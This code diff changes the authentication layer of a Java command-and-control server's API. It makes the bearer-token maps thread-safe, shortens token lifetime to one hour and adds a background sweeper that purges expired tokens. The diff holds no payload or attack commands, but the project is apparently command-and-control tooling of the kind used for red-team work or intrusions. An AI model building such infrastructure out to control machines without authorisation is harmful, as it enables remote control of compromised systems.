@@ -6,8 +6,11 @@ import java.security.SecureRandom;
 import java.time.Instant;
 import java.util.ArrayList;
 import java.util.Base64;
-import java.util.HashMap;
+import java.util.Map;
 import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
@@ -21,18 +24,30 @@ public class C2ServerAPI implements Runnable {
     // Pointer back to the C2 Server
     private C2Server C2server; 
 
-    // Maps that store data about bearer tokens
-    private HashMap<String, String> bearerTokens;
-    private HashMap<String, Instant> bearerTokensExpirationTime;
+    // Maps that store data about bearer tokens. ConcurrentHashMap so the API
+    // handler threads and the background sweeper can touch them safely.
+    private ConcurrentHashMap<String, String> bearerTokens;
+    private ConcurrentHashMap<String, Instant> bearerTokensExpirationTime;
+
+    // Bearer token lifetime in seconds (one hour, matching the ttl reported by /auth)
+    private static final long TOKEN_TTL_SECONDS = 3600;
 
     // Secure Random Number Generator used to generate bearer tokens
     private final SecureRandom secRNG;
 
+    // Single daemon thread that periodically evicts expired bearer tokens
+    private final ScheduledExecutorService tokenSweeper;
+
     public C2ServerAPI(C2Server C2server){
         this.C2server = C2server;
         this.secRNG = new SecureRandom();
-        this.bearerTokens = new HashMap<>();
-        this.bearerTokensExpirationTime = new HashMap<>();
+        this.bearerTokens = new ConcurrentHashMap<>();
+        this.bearerTokensExpirationTime = new ConcurrentHashMap<>();
+        this.tokenSweeper = Executors.newSingleThreadScheduledExecutor(r -> {
+            Thread t = new Thread(r, "bearer-token-sweeper");
+            t.setDaemon(true);
+            return t;
+        });
     }
 
     /**
@@ -48,7 +63,7 @@ public class C2ServerAPI implements Runnable {
             hexString.append(hexChars.charAt(secRNG.nextInt(hexChars.length())));
         }
         bearerTokens.put(hexString.toString(), username);
-        bearerTokensExpirationTime.put(hexString.toString(), Instant.now().plusSeconds(36000));
+        bearerTokensExpirationTime.put(hexString.toString(), Instant.now().plusSeconds(TOKEN_TTL_SECONDS));
         return hexString.toString();
     }
 
@@ -59,8 +74,14 @@ public class C2ServerAPI implements Runnable {
      * @return true or false
      */
     private boolean validateBearerToken(String bearerToken){
-        if(bearerTokensExpirationTime.keySet().contains(bearerToken)){
-            return Instant.now().isBefore(bearerTokensExpirationTime.get(bearerToken)); 
+        Instant expiry = bearerTokensExpirationTime.get(bearerToken);
+        if(expiry != null){
+            if(Instant.now().isBefore(expiry)){
+                return true;
+            }
+            // Token has expired; reclaim it now instead of waiting for the sweep
+            bearerTokens.remove(bearerToken);
+            bearerTokensExpirationTime.remove(bearerToken);
         }
         return false;
     }
@@ -80,6 +101,22 @@ public class C2ServerAPI implements Runnable {
         for(String token : badTokens){
             bearerTokens.remove(token);
             bearerTokensExpirationTime.remove(token);
+        }
+    }
+
+    /**
+     * Removes all expired bearer tokens from both maps. Run periodically by the
+     * tokenSweeper so abandoned tokens (issued but never presented again) don't
+     * accumulate for the life of the process.
+     */
+    private void purgeExpiredTokens(){
+        Instant now = Instant.now();
+        for(Map.Entry<String, Instant> entry : bearerTokensExpirationTime.entrySet()){
+            if(now.isAfter(entry.getValue())){
+                String token = entry.getKey();
+                bearerTokens.remove(token);
+                bearerTokensExpirationTime.remove(token);
+            }
         }
     }
 
@@ -208,7 +245,7 @@ public class C2ServerAPI implements Runnable {
                     if(C2server.authenticate(username, C2Server.hashPassword(password))){
                         String bearerToken = generateBearerToken(username);
                         JSONObject jsonBearerObject = new JSONObject();
-                        jsonBearerObject.put("ttl", 3600);
+                        jsonBearerObject.put("ttl", TOKEN_TTL_SECONDS);
                         jsonBearerObject.put("bearer", bearerToken);
                         response = jsonBearerObject.toString();
                         t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
@@ -342,6 +379,9 @@ public class C2ServerAPI implements Runnable {
            
             httpServer.setExecutor(new ThreadPoolExecutor(4, 8, 30, TimeUnit.SECONDS, new ArrayBlockingQueue<Runnable>(100)));
             httpServer.start();
+
+            // Periodically evict expired bearer tokens so the maps don't grow unbounded
+            tokenSweeper.scheduleAtFixedRate(this::purgeExpiredTokens, 10, 10, TimeUnit.MINUTES);
 
         } catch (Exception exception) {
             System.out.println("Failed to create API Server");
